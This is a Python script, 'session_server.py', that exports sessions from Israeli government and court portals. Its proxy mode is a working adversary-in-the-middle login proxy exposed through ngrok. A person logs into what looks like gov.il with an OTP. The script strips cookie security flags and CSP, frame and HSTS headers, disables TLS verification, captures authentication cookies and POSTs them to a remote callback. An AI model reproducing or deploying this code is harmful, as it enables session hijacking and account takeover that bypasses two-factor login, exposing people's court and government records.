#!/usr/bin/env python3
"""
session_server.py — session export server with two modes.

Local mode (no --callback):
  python session_server.py [net|bdr|eca]
  Opens visible Playwright browser; user clicks "Done" to export.

Proxy mode (--callback URL):
  python session_server.py --callback https://DAVID/api/profiles/receive_cookies
  Acts as a reverse proxy for the gov.il login flow.
  Jeremy opens the ngrok URL → sees gov.il → logs in normally (OTP to phone) →
  cookies captured in transit → POSTed to David's callback automatically.
"""
import sys, json, time, os, threading, re, gzip, subprocess, urllib.request, urllib.parse, webbrowser
import httpx as _httpx
import urllib.request as _urllib_req
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
from pathlib import Path

# ── auto-install playwright (local mode only) ─────────────────────────────────
def _ensure(pkg):
    try: __import__(pkg.replace("-","_").split("[")[0])
    except ImportError:
        print(f"  מתקין {pkg}…")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)

# ── args ──────────────────────────────────────────────────────────────────────
PORT = 7777
callback_url = ""
portal_key   = "auto"
email_to     = ""

i = 1
while i < len(sys.argv):
    a = sys.argv[i]
    if a in ("--callback", "-c") and i+1 < len(sys.argv):
        callback_url = sys.argv[i+1]; i += 2
    elif a in ("--email", "-e") and i+1 < len(sys.argv):
        email_to = sys.argv[i+1]; i += 2
    else:
        portal_key = a.lower(); i += 1

PORTALS = {
    "bdr": {"url": "https://sides.rbc.gov.il/Pages/FilesList.aspx",           "label": "בית הדין הרבני"},
    "net": {"url": "https://www.court.gov.il/ngcs.web.site/homepage.aspx",     "label": "נט המשפט"},
    "eca": {"url": "https://publicsso.eca.gov.il/he/home/OpenCase",            "label": "הוצאה לפועל"},
    "auto":{"url": "https://my.gov.il/sec/",                                   "label": "gov.il"},
}
if portal_key not in PORTALS:
    print(f"פורטל לא מוכר: {portal_key}"); sys.exit(2)
P = PORTALS[portal_key]

# ── shared state ──────────────────────────────────────────────────────────────
_state = {"ready": False, "payload": None, "error": "",
          "sent_ok": False, "cookies": {},
          "visited_login": False,   # True once request went to login.gov.il
          "posted_saml": False,     # True once browser POSTed SAMLResponse back to portal
          }
_done_evt  = threading.Event()
_pw_ready  = threading.Event()
OUT = Path(f"session_{portal_key}.json")

import logging as _logging
_LOG_FILE = Path(f"/tmp/session_server_{PORT}.log")
_logging.basicConfig(
    level=_logging.DEBUG,
    format="%(asctime)s %(levelname)s %(message)s",
    handlers=[
        _logging.FileHandler(_LOG_FILE, encoding="utf-8"),
        _logging.StreamHandler(sys.stdout),
    ],
    force=True,
)
_log = _logging.getLogger("proxy")

# ═══════════════════════════════════════════════════════════════════════════════
# PROXY MODE
# ═══════════════════════════════════════════════════════════════════════════════

# Domains we proxy — everything else passes through untouched
_PROXY_DOMAINS = {
    "www.court.gov.il",
    "court.gov.il",
    "login.gov.il",
    "accounts.gov.il",
    "sidur.court.gov.il",
    "sides.rbc.gov.il",
    "publicsso.eca.gov.il",
    "eca.gov.il",
    "iam.gov.il",
    "www.gov.il",
    "my.gov.il",
    "static.gov.il",
    "cdn.gov.il",
    "idgov.gov.il",
    "eform.gov.il",
}

# httpx transport — no shared cookie jar (cookies come only from the browser)
_httpx_transport = _httpx.HTTPTransport(http2=False, verify=False)

# Cookies that indicate ACTUAL authentication (not just session start)
# ASP.NET_SessionId is excluded — it's created on any first visit
_AUTH_COOKIE_NAMES = {
    # court.gov.il / ASP.NET portals
    ".ASPXAUTH", "authToken", "govil_auth", "NGCS_Session",
    "FedAuth", "FedAuth1", ".AspNet.Cookies",
    # my.gov.il — F5_ST is set only after successful SAML authentication
    "F5_ST",
}

_OUR_HOST = ""   # filled in at runtime from ngrok URL (set by app.py via env or arg)

def _is_proxy_domain(host):
    host = re.sub(r':\d+$', '', host)
    return any(host == d or host.endswith('.'+d) for d in _PROXY_DOMAINS)

def _rewrite_url_to_proxy(url: str) -> str:
    """Turn https://login.gov.il/path → /proxy/login.gov.il/path"""
    if not url.startswith('http'):
        return url
    p = urllib.parse.urlparse(url)
    if not _is_proxy_domain(p.netloc):
        return url
    path = p.path or '/'
    qs   = ('?' + p.query) if p.query else ''
    frag = ('#' + p.fragment) if p.fragment else ''
    return f'/proxy/{p.netloc}{path}{qs}{frag}'

def _detect_encoding(body: bytes, content_type: str) -> str:
    """Detect character encoding from Content-Type header or HTML meta tag."""
    ct = content_type.lower()
    if 'charset=' in ct:
        enc = ct.split('charset=')[1].split(';')[0].strip().strip('"\'')
        if enc: return enc
    # Scan first 2 KB for meta charset
    head = body[:2048].decode('latin-1', errors='replace')
    m = re.search(r'charset=["\']?\s*([\w-]+)', head, re.I)
    if m: return m.group(1)
    return 'utf-8'

def _rewrite_body(body: bytes, content_type: str, current_host: str = "") -> bytes:
    if not ('html' in content_type or 'javascript' in content_type
            or 'css' in content_type or 'json' in content_type):
        return body
    enc = _detect_encoding(body, content_type)
    try:
        text = body.decode(enc, errors='replace')
    except (LookupError, Exception):
        text = body.decode('utf-8', errors='replace')

    # Rewrite all occurrences of proxy domains — simplest and most reliable
    for domain in _PROXY_DOMAINS:
        text = text.replace(f'https://{domain}', f'/proxy/{domain}')
        text = text.replace(f'http://{domain}',  f'/proxy/{domain}')
        text = text.replace(f'//{domain}',        f'/proxy/{domain}')

    # Rewrite root-relative URLs (e.g. /path/to/style.css → /proxy/<host>/path/to/style.css)
    # Must come after absolute-URL rewriting above
    if current_host:
        prefix = f'/proxy/{current_host}'
        # Match src="/...", href="/...", url('/...'), url("/..."), url(/...)
        # but NOT already-rewritten /proxy/... paths
        def _fix_root_rel(m):
            quote_open = m.group(1)
            slash_path = m.group(2)
            quote_close = m.group(3)
            if slash_path.startswith('/proxy/'):
                return m.group(0)
            return quote_open + prefix + slash_path + quote_close

        text = re.sub(
            r'((?:src|href|action)=["\'])(/[^"\'> \n][^"\'> \n]*?)(["\'])',
            _fix_root_rel, text)
        text = re.sub(
            r'(url\(["\']?)(/[^"\')\n][^"\')\n]*?)(["\']?\))',
            _fix_root_rel, text)
        # srcset="/img 2x, /img2 3x"
        def _fix_srcset(m):
            val = m.group(1)
            def _each(mm):
                url_part = mm.group(1)
                if url_part.startswith('/proxy/') or not url_part.startswith('/'):
                    return mm.group(0)
                return prefix + url_part + (mm.group(2) or '')
            return 'srcset="' + re.sub(r'(/[^\s,]+)(\s+\d+[wx])?', _each, val) + '"'
        text = re.sub(r'srcset=["\']([^"\']+)["\']', _fix_srcset, text)

    # Re-encode as UTF-8 and update meta charset so browser reads it correctly
    text = re.sub(r'(charset=["\']?)\s*[\w-]+', r'\g<1>utf-8', text, flags=re.I)
    return text.encode('utf-8')

def _check_login_success(cookies_dict: dict) -> bool:
    names = {k.strip() for k in cookies_dict}
    return bool(names & _AUTH_COOKIE_NAMES)

def _build_payload_from_proxy() -> dict:
    import time as _t
    cookies_list = []
    for info in _state["cookies"].values():
        # info may be {"raw": ..., "host": ...} or plain string (legacy)
        if isinstance(info, dict):
            raw, cookie_host = info["raw"], info["host"]
        else:
            raw, cookie_host = info, "my.gov.il"
        parts = [p.strip() for p in raw.split(';')]
        kv    = parts[0].split('=', 1)
        name  = kv[0].strip()
        value = kv[1] if len(kv) > 1 else ''
        c = {"name": name, "value": value, "domain": cookie_host,
             "path": "/", "httpOnly": False, "secure": True, "sameSite": "Lax"}
        for p in parts[1:]:
            pl = p.lower()
            if pl == "httponly":   c["httpOnly"] = True
            elif pl == "secure":   c["secure"]   = True
            elif pl.startswith("domain="):  c["domain"] = p.split('=',1)[1]
            elif pl.startswith("path="):    c["path"]   = p.split('=',1)[1]
            elif pl.startswith("samesite="): c["sameSite"] = p.split('=',1)[1]
        cookies_list.append(c)
    return {
        "portal":        portal_key,
        "exported_at":   _t.time(),
        "exported_iso":  _t.strftime("%Y-%m-%dT%H:%M:%S"),
        "storage_state": {"cookies": cookies_list, "origins": []},
    }

def _send_to_callback(payload: dict):
    try:
        body = json.dumps(payload).encode()
        req  = urllib.request.Request(
            callback_url, data=body,
            headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=10)
        _state["sent_ok"] = True
        print("  ✓ עוגיות נשלחו לדוד אוטומטית")
    except Exception as e:
        _state["sent_ok"] = False
        print(f"  ✗ שליחה נכשלה: {e}")

import ssl as _ssl
_ssl_ctx = _ssl.create_default_context()

class ProxyHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def _html(self, code, body):
        b = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(b)))
        self.send_header("ngrok-skip-browser-warning", "1")
        self.end_headers(); self.wfile.write(b)

    def do_GET(self):  self._handle("GET",  b"")
    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        self._handle("POST", self.rfile.read(n))
    def do_HEAD(self): self._handle("HEAD", b"")

    def _handle(self, method, req_body):
        try:
            self._handle_inner(method, req_body)
        except Exception as e:
            import traceback
            _log.error(f"unhandled: {method} {self.path}\n{traceback.format_exc()}")
            try:
                self._html(502, f"<h2>Proxy error</h2><pre>{e}</pre>")
            except Exception:
                pass

    def _handle_inner(self, method, req_body):
        _log.info(f">> {method} {self.path[:120]}")
        path = self.path

        # Entry point — redirect to proxied court portal
        if path in ('/', '/start'):
            entry = _rewrite_url_to_proxy(P["url"])
            self.send_response(302)
            self.send_header("Location", entry)
            self.send_header("ngrok-skip-browser-warning", "1")
            self.end_headers(); return

        # Already done page
        if path == '/done_proxy':
            self._html(200, """<!DOCTYPE html><html dir="rtl"><body
              style="font-family:sans-serif;text-align:center;padding:40px;background:#0d1117;color:#c9d1d9">
              <h1 style="color:#3fb950">✅ הכניסה הצליחה!</h1>
              <p>העוגיות נשלחו לעורך הדין אוטומטית. אפשר לסגור את הדף.</p>
              </body></html>"""); return

        # Proxy path /proxy/<host>/<rest>
        if path.startswith('/proxy/'):
            rest  = path[7:]
            slash = rest.find('/')
            host  = rest[:slash] if slash != -1 else rest
            rpath = rest[slash:] if slash != -1 else '/'
        elif path in ('/', '/start'):
            pass  # handled above
        else:
            # Root-relative resource request (e.g. /nidp/images/logo.png).
            # Derive the target host from the Referer header.
            referer = self.headers.get('Referer', '')
            m = re.search(r'/proxy/([^/]+)', referer)
            if m and _is_proxy_domain(m.group(1)):
                host  = m.group(1)
                rpath = path
                # redirect so the browser's path becomes canonical under /proxy/
                self.send_response(302)
                self.send_header('Location', f'/proxy/{host}{path}')
                self.send_header('ngrok-skip-browser-warning', '1')
                self.end_headers(); return
            self._html(404, "לא נמצא"); return

        target_url = f"https://{host}{rpath}"

        # Bypass static assets — redirect browser directly to origin (faster, no proxy overhead)
        _STATIC_EXT = ('.png','.jpg','.jpeg','.gif','.svg','.ico',
                       '.css','.woff','.woff2','.ttf','.eot',
                       '.js','.map','.webp','.avif')
        _rpath_lower = rpath.split('?')[0].lower()
        if method == 'GET' and any(_rpath_lower.endswith(e) for e in _STATIC_EXT):
            self.send_response(302)
            self.send_header('Location', target_url)
            self.send_header('ngrok-skip-browser-warning', '1')
            self.end_headers(); return

        # Forward headers
        fwd = {}
        for k, v in self.headers.items():
            kl = k.lower()
            if kl in ('host','content-length','transfer-encoding',
                      'connection','keep-alive'): continue
            if kl == 'origin':
                # Always replace with the target host — origin is just scheme+host
                v = f'https://{host}'
            elif kl == 'referer' and v:
                # rewrite back to original domain so gov.il doesn't reject CSRF check
                v = re.sub(r'https?://[^/]+/proxy/([^/]+)',
                           r'https://\1', v)
            fwd[k] = v
        fwd['Host'] = host

        try:
            with _httpx.Client(transport=_httpx_transport,
                               cookies=None, follow_redirects=False,
                               timeout=_httpx.Timeout(60.0, connect=15.0)) as _c:
                _resp = _c.request(
                    method, target_url,
                    content=req_body if req_body else None,
                    headers=fwd,
                )
            status = _resp.status_code
            rh     = _resp.headers
            rbody  = _resp.content
        except Exception as e:
            _log.error(f"upstream error {target_url}: {e}")
            self._html(502, f"<h2>Proxy error</h2><pre>{e}</pre>"); return

        _log.info(f"<< {status} {target_url[:100]}")

        # Track flow stages
        if 'login.gov.il' in host:
            _state["visited_login"] = True
        # SAMLResponse POST back to the portal means login just completed
        portal_domains = ("court.gov.il", "sides.rbc.gov.il", "publicsso.eca.gov.il", "my.gov.il")
        if (method == "POST" and any(d in host for d in portal_domains)
                and b"SAMLResponse" in req_body):
            _state["posted_saml"] = True

        # Capture & collect cookies (keyed by cookie name, with issuing host)
        _sc_list = (rh.get_list('set-cookie') if hasattr(rh, 'get_list')
                    else (rh.get_all('Set-Cookie') or []))
        for ck in _sc_list:
            name = ck.split('=')[0].strip()
            _state["cookies"][name] = {"raw": ck, "host": host}

        location = rh.get('Location', '')
        # Detect successful login — require visited_login + auth cookies.
        # posted_saml is desirable but some portals (my.gov.il) complete SAML
        # in a way that sets auth cookies without a direct SAMLResponse POST.
        if (not _state["ready"]
                and _state["visited_login"]
                and _check_login_success(_state["cookies"])):
            payload = _build_payload_from_proxy()
            _state["payload"] = payload; _state["ready"] = True
            OUT.write_text(json.dumps(payload, ensure_ascii=False, indent=2),
                           encoding="utf-8")
            threading.Thread(target=_send_to_callback, args=(payload,), daemon=True).start()
            self.send_response(302)
            self.send_header("Location", "/done_proxy")
            self.send_header("ngrok-skip-browser-warning","1")
            self.end_headers(); return

        # Decompress body
        enc = rh.get('Content-Encoding','')
        if 'gzip' in enc:
            try: rbody = gzip.decompress(rbody)
            except Exception: pass
        elif 'br' in enc:
            try:
                import brotli; rbody = brotli.decompress(rbody)
            except Exception: pass

        ct = rh.get('Content-Type','')
        rbody = _rewrite_body(rbody, ct, current_host=host)

        # Rewrite Location header
        if location:
            if location.startswith('http'):
                location = _rewrite_url_to_proxy(location)
            elif location.startswith('//'):
                # protocol-relative
                loc_host = location[2:].split('/')[0]
                if _is_proxy_domain(loc_host):
                    location = '/proxy/' + location[2:]
            elif location.startswith('/'):
                # root-relative: prepend current host
                location = f'/proxy/{host}{location}'

        def _rewrite_cookie(v):
            v = re.sub(r';\s*[Ss]ecure', '', v)
            v = re.sub(r';\s*[Ss]ame[Ss]ite=[^;]+', '', v)
            v = re.sub(r';\s*[Dd]omain=[^;]+', '', v)
            v = re.sub(r';\s*[Pp]ath=[^;]+', '; Path=/', v)
            return v

        # Send response
        self.send_response(status)
        skip = {'transfer-encoding','content-encoding','content-length',
                'content-security-policy','x-frame-options','strict-transport-security',
                'set-cookie'}
        sent_ct = False

        # Send each Set-Cookie individually (httpx may merge them; split them back)
        for raw_ck in (rh.get_list('set-cookie') if hasattr(rh, 'get_list') else (rh.get_all('Set-Cookie') or [])):
            # httpx sometimes merges multiple cookies with ', ' — split on '; '-terminated values
            # Safest: treat each raw_ck as potentially one or more cookies
            for single in re.split(r',\s*(?=[A-Za-z_][A-Za-z0-9_\-]*=)', raw_ck):
                self.send_header('Set-Cookie', _rewrite_cookie(single.strip()))

        for k, v in rh.items():
            kl = k.lower()
            if kl in skip: continue
            if kl == 'set-cookie':
                pass  # handled above
            elif kl == 'location':
                v = location
            elif kl == 'content-type':
                # Ensure charset=utf-8 since we re-encoded the body
                if 'charset=' in v.lower():
                    v = re.sub(r'charset=[\w-]+', 'charset=utf-8', v, flags=re.I)
                elif 'text/' in v or 'javascript' in v:
                    v = v.rstrip('; ') + '; charset=utf-8'
                sent_ct = True
            self.send_header(k, v)
        if not sent_ct:
            self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(rbody)))
        self.send_header('ngrok-skip-browser-warning', '1')
        self.end_headers()
        if method != 'HEAD':
            self.wfile.write(rbody)


# ═══════════════════════════════════════════════════════════════════════════════
# LOCAL MODE (unchanged)
# ═══════════════════════════════════════════════════════════════════════════════

def _export_cookies_local(ctx):
    import time as _t
    state = ctx.storage_state()
    payload = {
        "portal": portal_key, "url": P["url"],
        "exported_at": _t.time(), "exported_iso": _t.strftime("%Y-%m-%dT%H:%M:%S"),
        "storage_state": state,
    }
    OUT.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
    _state["payload"] = payload
    if callback_url:
        try:
            body = json.dumps(payload).encode()
            req  = urllib.request.Request(callback_url, data=body,
                       headers={"Content-Type":"application/json"}, method="POST")
            urllib.request.urlopen(req, timeout=10)
            _state["sent_ok"] = True
        except Exception as ce:
            print(f"  ✗ שליחה נכשלה: {ce}")

def _browser_local():
    _ensure("playwright")
    from playwright.sync_api import sync_playwright
    profile_dir = str(Path.home() / ".lias_session_profile")
    try:
        with sync_playwright() as pw:
            ctx = pw.chromium.launch_persistent_context(
                profile_dir, headless=False,
                args=["--disable-blink-features=AutomationControlled","--start-maximized"])
            page = ctx.pages[0] if ctx.pages else ctx.new_page()
            page.goto(P["url"], wait_until="domcontentloaded", timeout=60_000)
            _pw_ready.set()
            _done_evt.wait()
            _export_cookies_local(ctx)
            _state["ready"] = True
            try: ctx.close()
            except Exception: pass
    except Exception as e:
        _state["error"] = str(e); _state["ready"] = True; _done_evt.set()

_PAGE_WAITING = """<!DOCTYPE html><html dir="rtl" lang="he">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ייצוא סשן</title>
<style>body{font-family:sans-serif;background:#0d1117;color:#c9d1d9;display:flex;
flex-direction:column;align-items:center;justify-content:center;min-height:100vh;
margin:0;padding:20px;text-align:center}
h1{font-size:24px}
.step{background:#161b22;border:1px solid #21262d;border-radius:12px;
padding:20px 28px;max-width:420px;margin-bottom:20px;line-height:1.8}
.step b{color:#58a6ff}
button{background:#238636;border:none;border-radius:8px;color:#fff;
font-size:17px;padding:14px 40px;cursor:pointer;font-family:inherit}
button:disabled{background:#21262d;color:#444;cursor:default}
#st{font-size:13px;color:#6e7681;margin-top:12px;min-height:20px}
</style></head><body>
<h1>🔐 ייצוא סשן — __LABEL__</h1>
<div class="step">
  <b>שלב 1</b> — בדפדפן שנפתח, התחבר.<br>
  <b>שלב 2</b> — חזור לכאן ולחץ:
</div>
<button id="btn" onclick="done()">✅ סיימתי — ייצא עוגיות</button>
<div id="st"></div>
<script>
async function done(){
  document.getElementById('btn').disabled=true;
  document.getElementById('st').textContent='מייצא…';
  const r=await fetch('/done',{method:'POST'});
  const j=await r.json();
  if(j.ok){document.getElementById('st').innerHTML='<span style="color:#3fb950">✓ '+j.cookies+' עוגיות</span>';
    setTimeout(()=>location.href='/result',800);}
  else{document.getElementById('st').innerHTML='<span style="color:#f85149">'+j.error+'</span>';
    document.getElementById('btn').disabled=false;}
}
</script></body></html>"""

_PAGE_RESULT = """<!DOCTYPE html><html dir="rtl" lang="he">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>סשן יוצא</title>
<style>body{font-family:sans-serif;background:#0d1117;color:#c9d1d9;display:flex;flex-direction:column;
align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px;text-align:center}
h1{color:#3fb950}a.dl{background:#1f6feb;color:#fff;border-radius:8px;padding:12px 28px;
text-decoration:none;font-size:15px;margin:8px}
</style></head><body>
<h1>✅ הסשן יוצא!</h1>
<p>__LABEL__ — __COOKIES__ עוגיות</p>
<a class="dl" href="/download">⬇ הורד קובץ</a>
</body></html>"""

class LocalHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _send(self, code, body, ct="text/html; charset=utf-8"):
        b = body.encode() if isinstance(body, str) else body
        self.send_response(code); self.send_header("Content-Type",ct)
        self.send_header("Content-Length",str(len(b)))
        self.send_header("ngrok-skip-browser-warning","1")
        self.end_headers(); self.wfile.write(b)

    def do_GET(self):
        if self.path in ('/','index.html'):
            self._send(200, _PAGE_WAITING.replace("__LABEL__", P["label"]))
        elif self.path == '/result':
            if not _state["ready"]:
                self.send_response(302); self.send_header("Location","/"); self.end_headers(); return
            n = len((_state["payload"] or {}).get("storage_state",{}).get("cookies",[]))
            html = (_PAGE_RESULT.replace("__LABEL__",P["label"]).replace("__COOKIES__",str(n)))
            self._send(200, html)
        elif self.path == '/download':
            if not OUT.exists(): self._send(404,"לא נמצא"); return
            data=OUT.read_bytes()
            self.send_response(200)
            self.send_header("Content-Type","application/json")
            self.send_header("Content-Disposition",f'attachment; filename="{OUT.name}"')
            self.send_header("Content-Length",str(len(data)))
            self.end_headers(); self.wfile.write(data)
        else: self._send(404,"לא נמצא")

    def do_POST(self):
        if self.path == '/done':
            _done_evt.set()
            for _ in range(30):
                if _state["ready"]: break
                time.sleep(0.5)
            if _state.get("error"):
                self._send(200,json.dumps({"ok":False,"error":_state["error"]}),"application/json")
            else:
                n = len((_state["payload"] or {}).get("storage_state",{}).get("cookies",[]))
                self._send(200,json.dumps({"ok":True,"cookies":n}),"application/json")
        else: self._send(404,"לא נמצא")


# ── main ──────────────────────────────────────────────────────────────────────
def main():
    print("═"*58)
    print(f"  ייצוא סשן — {P['label']}")
    if callback_url:
        print(f"  מצב: Proxy → {callback_url}")
    print("═"*58)

    if callback_url:
        # Proxy mode — no Playwright needed, just the HTTP proxy
        HandlerClass = ProxyHandler
        print(f"\n  שרת Proxy מוכן: http://localhost:{PORT}")
        print(f"  ממתין לכניסה של הלקוח…\n")
    else:
        # Local mode — open visible browser
        _ensure("playwright")
        t = threading.Thread(target=_browser_local, daemon=True)
        t.start()
        _pw_ready.wait(timeout=30)
        HandlerClass = LocalHandler
        url = f"http://localhost:{PORT}"
        print(f"\n  פתח: {url}\n")
        webbrowser.open(url)

    srv = ThreadingHTTPServer(("0.0.0.0", PORT), HandlerClass)

    def _watchdog():
        while not _state["ready"]:
            time.sleep(0.3)
        # Wait for callback POST to complete (or timeout after 8 s)
        for _ in range(40):
            if _state.get("sent_ok") or not callback_url:
                break
            time.sleep(0.2)
        time.sleep(1.0)   # let /done_proxy page load in client browser
        srv.shutdown()

    threading.Thread(target=_watchdog, daemon=True).start()
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass

    if _state.get("error"):
        print(f"\n  ✗ שגיאה: {_state['error']}"); return 1
    n = len((_state["payload"] or {}).get("storage_state",{}).get("cookies",[]))
    print(f"\n  ✓ {OUT}  ({n} עוגיות)")
    return 0

if __name__ == "__main__":
    sys.exit(main())
